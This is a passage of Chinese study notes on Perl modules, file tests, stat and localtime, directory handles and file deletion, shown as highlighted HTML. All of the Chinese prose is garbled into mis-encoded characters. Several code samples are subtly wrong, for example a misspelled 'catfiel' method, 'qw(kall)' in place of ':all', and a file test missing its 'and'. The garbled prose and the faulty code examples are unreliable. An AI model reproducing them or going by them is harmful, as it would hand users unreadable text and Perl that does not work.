class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">use <span class="hljs-built_in">File</span>::Basename<br></code></pre></td></tr></table></figure><p>å…¶æä¾›çš„ <code>basename</code> å‡½æ•°ç”¨äºè·å–æ–‡ä»¶çš„ basename.</p><p><code>dirname</code> å‡½æ•°ç”¨äºè·å–ç›®å½•åç§°.</p><h3 id="ä»…é€‰ç”¨æ¨¡å—ä¸­çš„éƒ¨åˆ†å‡½æ•°"><a href="#ä»…é€‰ç”¨æ¨¡å—ä¸­çš„éƒ¨åˆ†å‡½æ•°" class="headerlink" title="ä»…é€‰ç”¨æ¨¡å—ä¸­çš„éƒ¨åˆ†å‡½æ•°"></a>ä»…é€‰ç”¨æ¨¡å—ä¸­çš„éƒ¨åˆ†å‡½æ•°</h3><p>éœ€è¦åŠ ä¸Šä¸€ä¸ªå¯¼å…¥åˆ—è¡¨:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use <span class="hljs-keyword">File</span>::Basename qw<span class="hljs-regexp">/ basename /</span>;<br></code></pre></td></tr></table></figure><p>å†™æˆ:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use <span class="hljs-keyword">File</span>::Basename qw<span class="hljs-regexp">/ /</span>;<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Basename</span> ();<br></code></pre></td></tr></table></figure><p>è¡¨ç¤ºåœ¨åŠ è½½æ¨¡å—çš„åŒæ—¶ä¸å¯¼å…¥å‡½æ•°åç§°, æ„æ€å°±æ˜¯åªèƒ½ç”¨å…¨ç§°çš„æ–¹å¼æ¥å¼•ç”¨, å¦‚:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">my <span class="hljs-variable">$name</span> = <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Basename</span>::dirname <span class="hljs-variable">$name</span>;<br></code></pre></td></tr></table></figure><h3 id="File-Spec-æ¨¡å—"><a href="#File-Spec-æ¨¡å—" class="headerlink" title="File::Spec æ¨¡å—"></a>File::Spec æ¨¡å—</h3><p>File::Spec æ˜¯ file specification.</p><p>ä½¿ç”¨ <code>catfile</code> è¿™ä¸ª method, æ–¹æ³•çš„è°ƒç”¨éœ€è¦ä½¿ç”¨å…¨å:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Spec</span><br><br>my <span class="hljs-variable">$new_name</span> = <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Spec</span>-&gt;catfiel(<span class="hljs-variable">$dirname</span>, <span class="hljs-variable">$basename</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ¨¡å—ç§°ä¸ºç±» (class), ä¸”ä½¿ç”¨ <code>-&gt;</code>.</p><h3 id="Path-Class-æ¨¡å—"><a href="#Path-Class-æ¨¡å—" class="headerlink" title="Path::Class æ¨¡å—"></a>Path::Class æ¨¡å—</h3><p>è§ä¹¦æˆ–è€… perldoc.</p><h3 id="CGI-pm-æ¨¡å—"><a href="#CGI-pm-æ¨¡å—" class="headerlink" title="CGI.pm æ¨¡å—"></a>CGI.pm æ¨¡å—</h3><p>åˆ›å»º CGI ç¨‹åºæ—¶, æœ€å¥½ç›´æ¥ä½¿ç”¨ <code>CGI.pm</code> æ¨¡å—.</p><p>åœ¨å¯¼å…¥åˆ—è¡¨ä¸­ä½¿ç”¨ <code>:all</code> (ä¸€ç§å¯¼å‡ºæ ‡ç­¾ export tag å†™æ³•), å¯¼å‡ºä¸€ç»„å‡½æ•°.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><br><span class="hljs-keyword">use</span> CGI <span class="hljs-string">qw(kall)</span>;<br><br><span class="hljs-keyword">print</span> header(<span class="hljs-string">&quot;text/plain&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> $param ( param() ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$param: &quot;</span> . param($param) . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ•°æ®åº“å’Œ-DBI-æ¨¡å—"><a href="#æ•°æ®åº“å’Œ-DBI-æ¨¡å—" class="headerlink" title="æ•°æ®åº“å’Œ DBI æ¨¡å—"></a>æ•°æ®åº“å’Œ DBI æ¨¡å—</h3><p>DBI (Database Interface, æ•°æ®åº“æ¥å£) æ¨¡å—. å…·ä½“æŸ¥çœ‹ &lt;<Programmingthe Perl DBI>&gt; è¿™æœ¬ä¹¦.</p><p>DBI æ¨¡å—çš„ <a href="http://dbi.perl.org/">å®˜ç½‘</a> </p><p>å®‰è£…äº† DBI ä¹‹å, è¿˜éœ€è¦å®‰è£… DBD (Database Driver, æ•°æ®åº“é©±åŠ¨ç¨‹åº). å¯åœ¨ CPAN ä¸Šæœç´¢ DBD.</p><h3 id="å¤„ç†æ—¥æœŸå’Œæ—¶é—´çš„æ¨¡å—"><a href="#å¤„ç†æ—¥æœŸå’Œæ—¶é—´çš„æ¨¡å—" class="headerlink" title="å¤„ç†æ—¥æœŸå’Œæ—¶é—´çš„æ¨¡å—"></a>å¤„ç†æ—¥æœŸå’Œæ—¶é—´çš„æ¨¡å—</h3><p>ä½¿ç”¨ DateTime æ¨¡å—.</p><p>æ›´ç®€ä¾¿çš„æ˜¯ä½¿ç”¨ Time::Piece æ¨¡å—, å…¶ä¼šé‡è½½ Perl å†…ç½®çš„ localtime å‡½æ•°, è¿”å›ä¸€ä¸ªæ—¶é—´å¯¹è±¡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Time::Piece<br><br><span class="hljs-keyword">my</span> $t = <span class="hljs-keyword">localtime</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;The month is &#x27;</span> . $t-&gt;month . <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä» Perl 5.10 èµ·, Time::Piece æ¨¡å—ä¸º Perl è‡ªå¸¦.</p><h1 id="ç¬¬åäºŒç« -æ–‡ä»¶æµ‹è¯•"><a href="#ç¬¬åäºŒç« -æ–‡ä»¶æµ‹è¯•" class="headerlink" title="ç¬¬åäºŒç«  æ–‡ä»¶æµ‹è¯•"></a>ç¬¬åäºŒç«  æ–‡ä»¶æµ‹è¯•</h1><h2 id="æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦å·"><a href="#æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦å·" class="headerlink" title="æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦å·"></a>æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦å·</h2><p>ç»å¤§å¤šæ•°æµ‹è¯•æ“ä½œç¬¦è¿”å›å¸ƒå°”çœŸå‡å€¼.</p><p>å®ƒä»¬ç›¸åº”çš„æ–‡æ¡£å†™åœ¨ perlfunc é‡Œé¢.</p><p>æŸ¥çœ‹å®Œæ•´æ¸…å•:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc -f -X<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯ <code>X</code>.</p><p><code>-e</code> åˆ¤æ–­æ˜¯å¦å­˜åœ¨.</p><p><code>-M</code> åˆ¤æ–­æ›´æ–°.</p><p>åˆ—è¡¨:<br><img src="/../img/file_test_ope1.png"></p><p><img src="/../img/file_test_ope2.png"></p><p>Unix æ–‡ä»¶ç³»ç»Ÿä¸Šæœ‰ä¸”ä»…æœ‰ 7 ç§æ–‡ä»¶ç±»å‹. å¯åˆ†åˆ«ç”±ä»¥ä¸‹ 7 ç§æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦ä»£è¡¨: <code>-f</code>, <code>-d</code>, <code>-l</code>, <code>-S</code>, <code>-p</code>, <code>-b</code>, <code>-c</code>.</p><p>æ–‡ä»¶æ—¶é—´æµ‹è¯•ç¬¦, <code>-M</code>, <code>-A</code>, <code>-C</code> åˆ†åˆ«è¿”å›ä»è¯¥æ–‡ä»¶æœ€åä¸€æ¬¡è¢«ä¿®æ”¹, è¢«è®¿é—®æˆ–è€…å®ƒçš„ inode è¢«æ›´æ”¹ååˆ°ç°åœ¨çš„å¤©æ•°. å…·ä½“ç»†èŠ‚å¯æŸ¥çœ‹ç³»ç»Ÿå‡½æ•° <code>stat</code> çš„æ–‡æ¡£.</p><p>å¤©æ•°çš„å€¼ç”¨æµ®ç‚¹æ•°è¡¨ç¤º.</p><p>æ£€æŸ¥æ–‡ä»¶çš„æ—¶é—´è®°å½•æ—¶, å¯èƒ½ä¼šå¾—åˆ° <code>-1.2</code> è¿™æ ·çš„è´Ÿæ•°, è¿™è¡¨ç¤ºæ–‡é›†é‚£æœ€åä¸€æ¬¡è¢«è®¿é—®çš„æ—¶é—´æˆ³æ˜¯åœ¨æœªæ¥ 30 å°æ—¶å. ç¨‹åºå¼€å§‹è¿è¡Œçš„é‚£ä¸€åˆ»ä¼šè¢«è®°å½•ä¸‹æ¥ä½œä¸ºæ£€æŸ¥æ—¶é—´çš„åŸç‚¹. å› æ­¤è´Ÿå€¼å¯èƒ½è¡¨ç¤ºå·²ç»è¿è¡Œå¾ˆä¹…çš„ç¨‹åºæ‰¾åˆ°æŸä¸ªåˆšåˆšæ‰è¢«è®¿é—®è¿‡å¾—æ–‡ä»¶.</p><p><code>-T</code> å’Œ <code>-B</code> æµ‹è¯•æŸä¸ªæ–‡ä»¶æ˜¯æ–‡æœ¬æ–‡ä»¶è¿˜æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶.  å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨, éƒ½ä¸ºå‡. æ–‡ä»¶ä¸ºç©ºéƒ½ä¸ºçœŸ.</p><p><code>-t</code>, å¦‚æœè¢«æµ‹è¯•çš„æ–‡ä»¶å¥æŸ„æ˜¯ä¸€ä¸ª TTY è®¾å¤‡, è¿”å›çœŸ.</p><p>å¦‚æœæ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦åé¢æ²¡å†™æ–‡ä»¶åæˆ–æ–‡ä»¶å¥æŸ„, é‚£ä¹ˆé»˜è®¤çš„æ“ä½œæ•°å°±æ˜¯ <code>$_</code> é‡Œçš„æ–‡ä»¶å.</p><p>å¯ä»¥æœ‰è¿™æ ·çš„å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $size_in_k = (-s) / <span class="hljs-number">1024</span>; <br></code></pre></td></tr></table></figure><h2 id="æµ‹è¯•åŒä¸€æ–‡ä»¶çš„å¤šé¡¹å±æ€§"><a href="#æµ‹è¯•åŒä¸€æ–‡ä»¶çš„å¤šé¡¹å±æ€§" class="headerlink" title="æµ‹è¯•åŒä¸€æ–‡ä»¶çš„å¤šé¡¹å±æ€§"></a>æµ‹è¯•åŒä¸€æ–‡ä»¶çš„å¤šé¡¹å±æ€§</h2><p>ç»“åˆ <code>and</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (-r $file <span class="hljs-keyword">and</span> -w $file) &#123;<br>    ...<br>&#125; <br></code></pre></td></tr></table></figure><p>è¿™ç§å†™æ³•æ¯”è¾ƒæ¶ˆè€—èµ„æº.</p><p>ä½¿ç”¨è™šæ‹Ÿæ–‡ä»¶å¥æŸ„ <code>_</code>, å…¶å‘Šè¯‰ Perl ä½¿ç”¨ä¸Šæ¬¡æŸ¥è¯¢è¿‡çš„æ–‡ä»¶ä¿¡æ¯æ¥åšå½“å‰æµ‹è¯•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (-r $file -w <span class="hljs-number">_</span>) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–åˆ†å¼€å†™:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (-r $file) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The file is readable!\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (-w <span class="hljs-number">_</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The file is writable!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ ˆå¼æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦"><a href="#æ ˆå¼æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦" class="headerlink" title="æ ˆå¼æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦"></a>æ ˆå¼æ–‡ä»¶æµ‹è¯•æ“ä½œç¬¦</h2><p>åœ¨ Perl 5.10 ä¹‹å, å¯ä»¥è¿™æ ·æµ‹è¯•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.010</span>;<br><br><span class="hljs-keyword">if</span> (-w -r $file) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The file is both readable and writable!\n&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ç”¨åˆ†å¼€å†™, é è¿‘æ–‡ä»¶åçš„æµ‹è¯•ä¼šå…ˆæ‰§è¡Œ, æ¬¡åºä¸ºä»å³å¾€å·¦, è¿™ç§å«åš <mark>æ ˆå¼å†™æ³•</mark>.</p><h2 id="stat-å’Œ-lstat-å‡½æ•°"><a href="#stat-å’Œ-lstat-å‡½æ•°" class="headerlink" title="stat å’Œ lstat å‡½æ•°"></a>stat å’Œ lstat å‡½æ•°</h2><p><code>stat</code> å‡½æ•°èƒ½è¿”å›å’ŒåŒåçš„ Unix ç³»ç»Ÿè°ƒç”¨ stat è¿‘ä¹ä¸€æ ·ä¸°å¯Œçš„æ–‡ä»¶ä¿¡æ¯.</p><p><code>stat</code> å‡½æ•°çš„å‚æ•°å¯ä»¥æ˜¯æ–‡ä»¶å¥æŸ„, æˆ–æ˜¯æŸä¸ªä¼šè¿”å›æ–‡ä»¶åçš„è¡¨è¾¾å¼.</p><p><code>stat</code> å‡½æ•°æ‰§è¡Œå¤±è´¥, ä¼šè¿”å›ç©ºåˆ—è¡¨, æˆ–æ˜¯ä¸€ä¸ªå« 13 ä¸ªå…ƒç´ çš„æ•°å­—åˆ—è¡¨. å…·ä½“å«ä¹‰è§ä¹¦.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($dev, $ino, $mode, $nlink, $uid, $gid, $rdev, $size, $atime, $mtime, $ctime, $blksize, $blocks) = <span class="hljs-keyword">stat</span>($filename);<br></code></pre></td></tr></table></figure><h2 id="localtime-å‡½æ•°"><a href="#localtime-å‡½æ•°" class="headerlink" title="localtime å‡½æ•°"></a>localtime å‡½æ•°</h2><p>åœ¨æ ‡é‡ä¸Šä¸‹æ–‡ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $timestamp = <span class="hljs-number">1180630098</span>;<br><span class="hljs-keyword">my</span> $date = <span class="hljs-keyword">localtime</span> $timestamp;<br></code></pre></td></tr></table></figure><p>åœ¨åˆ—è¡¨ä¸Šä¸‹æ–‡ä¸­è¿”å›åˆ—è¡¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($sec, $min, $day, $mon, $year, $wday, $yday, $isdest) = <span class="hljs-keyword">localtime</span> $timestamp;<br></code></pre></td></tr></table></figure><p><code>gmtime</code> å‡½æ•°è¿”å›ä¸–ç•Œæ ‡å‡†æ—¶é—´.</p><p>é»˜è®¤æƒ…å†µä¸‹,  <code>localtime</code> å‡½æ•°å’Œ <code>gmtime</code> å‡½æ•°éƒ½ä½¿ç”¨å½“å‰ <code>time</code> è¿”å›çš„æ—¶é—´å€¼.</p><h2 id="æŒ‰ä½è¿ç®—æ“ä½œç¬¦"><a href="#æŒ‰ä½è¿ç®—æ“ä½œç¬¦" class="headerlink" title="æŒ‰ä½è¿ç®—æ“ä½œç¬¦"></a>æŒ‰ä½è¿ç®—æ“ä½œç¬¦</h2><p>å¦‚å¯¹ stat å‡½æ•°è¿”å›çš„æƒé™ä½è¿›è¡Œå¤„ç†.</p><p>åŸºæœ¬å’Œ C è¯­è¨€ç›¸åŒ.</p><p>å¦‚ä¸‹:<br><img src="/../img/binary_ope.png"></p><h2 id="ä½¿ç”¨ä½å­—ç¬¦ä¸²"><a href="#ä½¿ç”¨ä½å­—ç¬¦ä¸²" class="headerlink" title="ä½¿ç”¨ä½å­—ç¬¦ä¸²"></a>ä½¿ç”¨ä½å­—ç¬¦ä¸²</h2><p>å‡å¦‚æŒ‰ä½è¿ç®—æ“ä½œç¬¦çš„ä»»ä¸€æ“ä½œæ•°æ˜¯å­—ç¬¦ä¸², åˆ™ Perl ä¼šæŠŠå®ƒå½“æˆä½å­—ç¬¦ä¸²æ¥å¤„ç†.</p><p>å¦‚, â€œ\xAAâ€|â€\x55â€ çš„ç»“æœä¼šæ˜¯ â€œ\xFFâ€.</p><p>äº†è§£åˆ©ç”¨æŒ‰ä½è¿ç®—æ“ä½œç¬¦å¤„ç†ä½å­—ç¬¦ä¸²çš„ç»†èŠ‚, å‚é˜… perlop æ–‡æ¡£.</p><h1 id="ç¬¬13ç« -ç›®å½•æ“ä½œ"><a href="#ç¬¬13ç« -ç›®å½•æ“ä½œ" class="headerlink" title="ç¬¬13ç«  ç›®å½•æ“ä½œ"></a>ç¬¬13ç«  ç›®å½•æ“ä½œ</h1><h2 id="åœ¨ç›®å½•æ ‘ä¸­ç§»åŠ¨"><a href="#åœ¨ç›®å½•æ ‘ä¸­ç§»åŠ¨" class="headerlink" title="åœ¨ç›®å½•æ ‘ä¸­ç§»åŠ¨"></a>åœ¨ç›®å½•æ ‘ä¸­ç§»åŠ¨</h2><p>ä½¿ç”¨ <code>chdir</code> æ“ä½œç¬¦æ¥æ”¹å˜å½“å‰çš„å·¥ä½œç›®å½•. å’Œ Unix shell çš„ cd å‘½ä»¤å·®ä¸å¤š:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chdir</span> <span class="hljs-string">&#x27;/etc&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot chdir to /etc: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>å‘ç”Ÿé”™è¯¯æ—¶ä¼šè®¾ç½®æ ‡é‡å˜é‡ <code>$!</code>.</p><p>ç”± Perl ç¨‹åºå¯åŠ¨çš„æ‰€æœ‰è¿›ç¨‹éƒ½ä¼šç»§æ‰¿ Perl ç¨‹åºçš„å·¥ä½œç›®å½•.</p><p>å·¥ä½œç›®å½•çš„æ›´æ”¹æ— æ³•å½±å“è°ƒç”¨ Perl ç¨‹åºçš„è¿›ç¨‹. æ„æ€æ˜¯, ä½ ç”¨ shell è°ƒç”¨ Perl ç¨‹åº, å°½ç®¡è¿™ä¸ª Perl ç¨‹åºæ”¹å˜äº†å·¥ä½œç›®å½•, ä½†æ˜¯ Perl ç¨‹åºé€€å‡ºå, åˆä¼šå›åˆ°åŸæ¥çš„å·¥ä½œç›®å½•.</p><p>å¯ä»¥ç”¨ <code>File::HomeDir</code> æ¨¡å—, æŒ‡å®šè¿›å…¥ç”¨æˆ·çš„ä¸»ç›®å½•.</p><h2 id="æ–‡ä»¶åé€šé…"><a href="#æ–‡ä»¶åé€šé…" class="headerlink" title="æ–‡ä»¶åé€šé…"></a>æ–‡ä»¶åé€šé…</h2><p>ä½¿ç”¨ <code>glob</code> æ“ä½œç¬¦:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_files = <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br><span class="hljs-keyword">my</span> @pm_files = <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*.pm&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>@all_files</code> ä¼šå–å¾—å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å¹¶æŒ‰å­—æ¯é¡ºåºæ’åº, ä¸åŒ…æ‹¬ä»¥ç‚¹å·å¼€å¤´çš„æ–‡ä»¶.</p><p>æ‰€æœ‰èƒ½åœ¨å‘½ä»¤è¡Œä¸Šé”®å…¥çš„æ¨¡å¼éƒ½å¯ä»¥ä½œä¸º (å”¯ä¸€çš„) å‚æ•°äº¤ç»™ <code>glob</code> å¤„ç†:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_files_includeing_dot = <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;.* *&#x27;</span><br></code></pre></td></tr></table></figure><p>åœ¨ Perl 5.6 ä¹‹å‰, <code>glob</code> æ“ä½œç¬¦åªæ˜¯åœ¨åå°è°ƒç”¨ <code>/bin/csh</code> æ¥å±•å¼€æ–‡ä»¶å.</p><h2 id="æ–‡ä»¶åé€šé…çš„å¦ä¸€ç§è¯­æ³•"><a href="#æ–‡ä»¶åé€šé…çš„å¦ä¸€ç§è¯­æ³•" class="headerlink" title="æ–‡ä»¶åé€šé…çš„å¦ä¸€ç§è¯­æ³•"></a>æ–‡ä»¶åé€šé…çš„å¦ä¸€ç§è¯­æ³•</h2><p>åœ¨å‡ºç° <code>glob</code> æ“ä½œç¬¦ä¹‹å‰çš„å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_files = &lt;*&gt;;<br><span class="hljs-keyword">my</span> $dir = <span class="hljs-string">&#x27;/etc&#x27;</span>;<br><span class="hljs-keyword">my</span> @dir_files = &lt;$dir/* $dir/.*&gt;;<br></code></pre></td></tr></table></figure><h2 id="ç›®å½•å¥æŸ„-directory-handle"><a href="#ç›®å½•å¥æŸ„-directory-handle" class="headerlink" title="ç›®å½•å¥æŸ„ (directory handle)"></a>ç›®å½•å¥æŸ„ (directory handle)</h2><p>å’Œæ–‡ä»¶å¥æŸ„ä½¿ç”¨èµ·æ¥æ²¡å¤šå¤§å·®åˆ«.</p><p>ç”¨ <code>opendir</code> æ‰“å¼€, ç”¨ <code>readdir</code> è¯»å–, ç”¨ <code>closedir</code> å…³é—­. æ“ä½œçš„æ˜¯ç›®å½•é‡Œçš„æ–‡ä»¶å, è€Œä¸æ˜¯æ–‡ä»¶å†…å®¹.</p><p>ç›®å½•å¥æŸ„ä¼šåœ¨ç¨‹åºç»“æŸæ—¶è‡ªåŠ¨å…³é—­.</p><p><code>readdir</code> æ“ä½œç¬¦è¿”å›çš„æ–‡ä»¶åå¹¶ä¸å«è·¯å¾„å, åªæ˜¯ç›®å½•é‡Œçš„æ–‡ä»¶å. åªæœ‰åŠ ä¸Šè·¯å¾„åç§°æ‰æœ‰åŠæ³•å¾—åˆ°æ–‡ä»¶çš„å…¨å.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $somedir, $dirname <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot open $dirname: $!&quot;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $name = <span class="hljs-keyword">readdir</span> $somedir) &#123;<br>    <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> $name =~ <span class="hljs-regexp">/^\./</span>;<br>    $name = <span class="hljs-string">&quot;$dirname/$name&quot;</span>;<br>    <span class="hljs-keyword">next</span> <span class="hljs-keyword">unless</span> -f $name <span class="hljs-keyword">and</span> -r $name;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ <code>File::Spec::Functions</code> æˆ– <code>Path::Class</code> æ¨¡å—æ„é€ ç”¨äºæœ¬åœ°ç³»ç»Ÿçš„åˆé€‚æ–‡ä»¶å.</p><h2 id="é€’å½’è®¿é—®ç›®å½•"><a href="#é€’å½’è®¿é—®ç›®å½•" class="headerlink" title="é€’å½’è®¿é—®ç›®å½•"></a>é€’å½’è®¿é—®ç›®å½•</h2><p>Perl çš„ <code>File::Find</code> æˆ– <code>File::Find::Rule</code> æˆ– <code>File::Finder</code> æ¨¡å—å¯ä»¥å®ç° Unix ä¸‹çš„ find å‘½ä»¤.</p><h2 id="æ–‡ä»¶å’Œç›®å½•çš„æ“ä½œ"><a href="#æ–‡ä»¶å’Œç›®å½•çš„æ“ä½œ" class="headerlink" title="æ–‡ä»¶å’Œç›®å½•çš„æ“ä½œ"></a>æ–‡ä»¶å’Œç›®å½•çš„æ“ä½œ</h2><h3 id="åˆ é™¤æ–‡ä»¶"><a href="#åˆ é™¤æ–‡ä»¶" class="headerlink" title="åˆ é™¤æ–‡ä»¶"></a>åˆ é™¤æ–‡ä»¶</h3><p>ä½¿ç”¨ <code>unlink</code> æ“ä½œç¬¦, å¹¶æŒ‡å®šè¦åˆ é™¤çš„æ–‡ä»¶åˆ—è¡¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unlink</span> <span class="hljs-string">&#x27;slate&#x27;</span>, <span class="hljs-string">&#x27;bedrock&#x27;</span>, <span class="hljs-string">&#x27;lava&#x27;</span>;<br><span class="hljs-keyword">unlink</span> <span class="hljs-string">qw(slate bedrock lava)</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥é…åˆ <code>glob</code> ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unlink</span> <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*.o&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>unlink</code> çš„è¿”å›å€¼ä»£è¡¨æˆåŠŸåˆ é™¤çš„æ–‡ä»¶æ•°ç›®.</p><p>å¯ä»¥ä½¿ç”¨å¾ªç¯:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $file (<span class="hljs-string">qw(slate bedrock lava)</span>) &#123;<br>    <span class="hljs-keyword">unlink</span> $file <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Failed on $file: $!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>unlink</code> ä¸èƒ½ç”¨æ¥åˆ é™¤ç›®å½•. åˆ é™¤ç›®å½•è¦ä½¿ç”¨ <code>rmdir</code>.</p><p>åˆ é™¤æ–‡ä»¶çš„æƒé™è·Ÿæ–‡ä»¶æœ¬èº«çš„æƒé™ä½æ— å…³, å…¶å–å†³äºæ–‡ä»¶æ‰€åœ¨ç›®å½•çš„æƒé™ä½.</p><h3 id="é‡å‘½åæ–‡ä»¶"><a href="#é‡å‘½åæ–‡ä»¶" class="headerlink" title="é‡å‘½åæ–‡ä»¶"></a>é‡å‘½åæ–‡ä»¶</h3><p>ä½¿ç”¨ <code>rename</code> å‡½æ•°. ç›¸å½“ä¸å‘½ä»¤è¡Œä¸‹çš„ <code>mv</code>.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span 